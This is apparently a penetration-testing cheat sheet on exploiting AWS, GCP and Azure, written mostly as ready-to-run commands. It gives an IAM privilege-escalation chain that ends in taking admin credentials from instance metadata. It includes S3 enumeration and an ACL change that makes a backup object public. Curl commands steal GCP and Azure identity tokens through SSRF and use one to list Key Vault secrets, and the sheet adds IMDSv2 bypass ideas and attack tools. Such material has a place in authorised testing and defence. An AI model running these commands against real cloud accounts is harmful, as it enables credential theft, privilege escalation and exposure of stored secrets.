# Cloud Security: AWS, GCP, Azure Exploitation

## AWS IAM Privilege Escalation

### Key IAM Actions
```bash
iam:CreateAccessKey
iam:CreateUser + iam:AttachUserPolicy
iam:PutUserPolicy
iam:PassRole + ec2:RunInstances
iam:UpdateAssumeRolePolicy
iam:UpdateAccessKey
```

### Escalation Chain
1. Found AWS key with `iam:ListRoles` + `iam:PassRole` + `ec2:RunInstances`
2. Create EC2 instance with admin role attached
3. SSH in -> extract instance metadata -> admin credentials

## S3 Exploitation

### Bucket Enumeration
```bash
aws s3api get-bucket-acl --bucket target-backup
aws s3api get-bucket-policy --bucket target-backup
aws s3api get-public-access-block --bucket target-backup
aws s3 ls s3://target-backup/ --no-sign-request
```

### Bucket Misconfiguration
Object-level ACLs can bypass bucket-level public access blocks:
```bash
aws s3api put-object-acl --bucket target-backup --key config.json --acl public-read
curl https://target-backup.s3.amazonaws.com/config.json
```

## GCP Exploitation

### Service Account Key Leakage (SSRF)
```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
gcloud auth print-access-token
gcloud auth activate-service-account --key-file=key.json
```

### Bucket Enumeration
```bash
curl -s https://storage.googleapis.com/target-config/
python3 gcpbucketbrute.py -k target
```

## Azure Exploitation

### Managed Identity Token via SSRF
```bash
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -H "Metadata: true"
# Use token for Key Vault
curl "https://target-vault.vault.azure.net/secrets/?api-version=7.0" -H "Authorization: Bearer $TOKEN"
```

## IMDSv2 Bypass
- SSRF via AWS API: `http://instance-data.<region>.compute.amazonaws.com/`
- DNS rebinding to bypass token requirement
- Container escape to host-level metadata access

## Tooling
```bash
cloudfox aws -p target-profile
# Pacu - AWS exploitation framework
# ScoutSuite - multi-cloud auditing
```
